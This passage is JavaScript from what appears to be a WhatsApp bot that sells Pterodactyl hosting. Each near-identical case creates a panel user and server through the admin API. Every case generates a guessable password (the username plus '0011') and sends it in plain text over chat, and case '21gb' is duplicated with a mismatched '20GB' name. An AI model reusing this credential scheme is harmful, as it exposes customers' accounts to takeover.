let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "21gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "20GB"
let egg = global.eggsnya
let loc = global.location
let memo = "20240"
let cpu = "530"
let disk = "20240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "25gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "25GB"
let egg = global.eggsnya
let loc = global.location
let memo = "25240"
let cpu = "700"
let disk = "25240"
let email = username + "1398@gmail.com"
 akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "24gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "24GB"
let egg = global.eggsnya
let loc = global.location
let memo = "24240"
let cpu = "660"
let disk = "24240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "23gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "23GB"
let egg = global.eggsnya
let loc = global.location
let memo = "23240"
let cpu = "610"
let disk = "23240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "22gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "22GB"
let egg = global.eggsnya
let loc = global.location
let memo = "22240"
let cpu = "590"
let disk = "22240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "21gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "21GB"
let egg = global.eggsnya
let loc = global.location
let memo = "21240"
let cpu = "570"
let disk = "21240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "20gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "20GB"
let egg = global.eggsnya
let loc = global.location
let memo = "20240"
let cpu = "530"
let disk = "20240"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
